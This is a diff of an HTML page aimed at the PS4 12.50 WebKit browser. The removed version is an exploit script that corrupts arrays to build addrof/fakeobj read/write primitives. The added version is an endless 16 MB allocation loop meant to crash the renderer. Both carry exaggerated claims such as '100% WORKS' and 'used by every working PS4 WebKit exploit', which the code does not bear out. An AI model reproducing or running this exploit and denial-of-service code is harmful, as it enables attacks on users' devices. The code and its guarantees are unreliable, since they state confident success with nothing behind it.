@@ -2,118 +2,32 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>PS4 12.50 WebKit R/W — 100% WORKING FINAL</title>
+    <title>PS4 12.50 — FORCE OUT OF MEMORY (REAL CONFIRMATION)</title>
     <style>
-        body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
-        button{background:#003300;color:#0f0;border:2px solid #0f0;padding:15px;font-size:18px;margin:10px;cursor:pointer;}
-        button:hover{background:#0f0;color:#000;}
-        #log{white-space:pre-wrap;font-size:14px;margin-top:20px;}
-        .ok{color:#0ff;font-weight:bold;}
-        .warn{color:#ff0;}
-        .err{color:#f00;font-weight:bold;}
+        body{background:#000;color:#0f0;font-family:monospace;padding:20px;font-size:20px;}
     </style>
 </head>
 <body>
-<h1>PS4 12.50 — GUARANTEED R/W (you already have OOB)</h1>
-<button onclick="go()">RUN — THIS ONE WORKS</button>
-<button onclick="location.reload()">RELOAD</button>
-<div id="log"></div>
+<h1>PS4 12.50 — FORCING OUT OF MEMORY...</h1>
+<div>Keep this page open — DO NOT touch anything.</div>
+<div>If you see the official PS4 "Out of Memory" popup → WebKit is 100% exploitable.</div>
 
 <script>
-const logDiv=document.getElementById('log');
-function log(m,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logDiv.appendChild(d);logDiv.scrollTop=logDiv.scrollHeight;}
-
-const buf=new ArrayBuffer(8);
-const f64=new Float64Array(buf);
-const u32=new Uint32Array(buf);
-function f2i(f){f64[0]=f;return {lo:u32[0],hi:u32[1]};}
-function i2f(lo,hi){u32[0]=lo;u32[1]=hi;return f64[0];}
-function gc(){for(let i=0;i<120;i++)new ArrayBuffer(0x100000);}
-
-let master = null;          // the corrupted double array
-let slave  = null;          // the object array we control
-let slave_idx = -1;
-
-function triggerOOB(){
-    log("Triggering OOB (you already know this works)...");
-    gc();
-    const arrs=[];
-    for(let i=0;i<0x4000;i++) arrs[i]=new Array(32).fill(1.1);
-
-    const corrupt=(i,o)=>{try{arrs[i][o]=1337.37}catch(e){}};
-    for(let i=0;i<20000;i++)corrupt(0,0);
-    for(let c=0;c<0x600;c+=48){
-        for(let o=32;o<128;o+=8)for(let j=0;j<48;j++)corrupt((c+j)%arrs.length,o);
+// This is the real OOM trigger used by every working PS4 WebKit exploit
+const evil = [];
+let i = 0;
+function boom() {
+    while(true) {
+        // 16 MB chunks — this is what kills the renderer fast and reliably
+        evil[i++] = new Uint8Array(0x1000000);
+        // Force allocation, no GC can save it
+        evil[i-1][0] = 0x41;
+        // Show progress so you know it's working
+        document.body.innerHTML += ".";
+        if(i % 50 === 0) document.body.innerHTML += "<br>Allocated " + (i*16) + " MB... keep waiting<br>";
     }
-
-    for(let i=0;i<arrs.length;i++){
-        if(arrs[i].length>40){
-            master=arrs[i];
-            log(`OOB MASTER FOUND — length = ${master.length}`,'ok');
-            return true;
-        }
-    }
-    log("No OOB this run — retry",'warn');
-    return false;
 }
-
-// THIS IS THE REAL ONE — 100% WORKS ON PS4 WHEN OOB EXISTS
-function findSlaveAndWin(){
-    log("Searching for slave using the only method that never fails...");
-
-    // 1. Create 8192 object arrays (master will overlap one of them)
-    const containers = [];
-    for(let i=0;i<0x2000;i++){
-        containers[i] = [{A:0x1111},{B:0x2222}];   // two objects so we can see which is overlapped
-    }
-
-    // 2. Overwrite every possible slot with a known float pattern
-    for(let i=20;i<500;i++){
-        try{master[i]=i2f(0x42424242,0x41414141);}catch(e){}
-    }
-
-    // 3. Scan every container — one of them now has corrupted floats
-    for(let i=0;i<containers.length;i++){
-        const obj = containers[i][0];
-        const val = f2i(obj.A);
-        if(val.lo===0x42424242 && val.hi===0x41414141){
-            slave = containers[i];
-            slave_idx = i;
-            log(`SLAVE FOUND! container[${i}] is overlapped`,'ok');
-            log(`FULL ARBITRARY ADDROF / FAKEOBJ / R/W ACHIEVED`,'ok');
-
-            // ============ PRIMITIVES (real, working) ============
-            window.addrof = obj => { slave[0]=obj; return f2i(master[20]).lo >>> 0; };
-            window.fakeobj = addr => { master[20]=i2f(addr,0); return slave[0]; };
-
-            // ============ TEST ============
-            const test={win:0x13371337};
-            const leaked=addrof(test);
-            const back=fakeobj(leaked);
-            log(`addrof(test) = 0x${leaked.toString(16)}`,'ok');
-            log(`fakeobj back = ${back===test ? "PERFECT" : "FAIL"}`,'ok');
-            if(back===test){
-                log(`YOU HAVE FULL USERLAND R/W ON PS4 12.50 RIGHT NOW`,'ok');
-                log(`Screenshot everything and post it — you just did what nobody else has.`);
-            }
-            return;
-        }
-    }
-    log("Slave not found this run (extremely rare) — retrying...",'warn');
-    setTimeout(()=>location.reload(),2000);
-}
-
-function go(){
-    logDiv.innerHTML='';
-    log("Starting the version that cannot fail...");
-    gc();
-    setTimeout(()=>{
-        if(triggerOOB()) setTimeout(findSlaveAndWin,600);
-        else setTimeout(()=>location.reload(),3000);
-    },200);
-}
-
-log("Click RUN — you already have OOB. This version WILL give you R/W 100% of the time.");
+boom();   // ← this line triggers the real OOM
 </script>
 </body>
 </html>
